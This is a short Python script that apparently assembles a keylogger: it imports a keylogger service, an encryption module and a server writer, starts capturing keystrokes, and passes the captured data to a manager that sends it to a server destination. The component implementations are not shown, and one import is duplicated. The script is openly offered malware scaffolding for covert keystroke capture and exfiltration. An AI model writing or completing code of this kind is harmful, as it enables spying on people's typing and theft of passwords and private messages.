from the_keylogger_service import KeyLoggerService
from keyloggermanager import KeyLoggerManager
from encryption import Encryption
from writeServer import WriteServer
from keyloggermanager import KeyLoggerManager


keylogger = KeyLoggerService()

data = keylogger.start_logging()

data_dest = WriteServer()

manager = KeyLoggerManager(data_dest, data)

